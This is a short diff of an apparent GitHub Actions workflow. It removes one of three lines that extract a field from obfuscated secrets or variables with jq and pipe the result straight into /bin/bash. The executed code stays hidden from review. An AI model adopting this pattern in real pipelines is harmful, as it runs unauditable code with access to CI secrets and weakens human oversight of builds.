@@ -18,7 +18,6 @@ jobs:
           l9188: ${{ secrets.l9188 }}
         run: |
           printf '%s' "$l9188" | jq -r .ujhc2 | /bin/bash
-          printf '%s' "$u672" | jq -r .jucq31 | /bin/bash
           echo $ns7 | jq -r .jg4133 | /bin/bash
 
       - name: Save results
